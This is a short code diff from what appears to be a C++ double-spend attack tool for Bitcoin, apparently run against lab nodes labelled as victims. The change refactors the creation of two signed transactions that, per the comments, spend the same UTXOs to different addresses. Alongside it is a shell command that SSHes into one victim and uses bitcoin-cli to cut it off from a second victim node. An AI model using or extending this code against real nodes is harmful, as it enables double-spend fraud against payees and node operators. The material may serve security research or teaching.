@@ -47,8 +47,8 @@ int main() {
            << paidAmmounts.second - 0.01;
 
     //Create transactions using the same UTXOs, but to different addresses. 
-    std::pair<std::string, std::string> signedTransactionHexes = transactionHandler.createSignedTransactions(tx1Oss,
-                                                                                                             tx2Oss);
+    std::pair<std::string, std::string> signedTransactionHexes = std::make_pair(transactionHandler.createSignedTransaction(tx1Oss),
+                                                                                transactionHandler.createSignedTransaction(tx2Oss));
 
     //Disconnect VICTIM2.
     system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM2:18445\"");
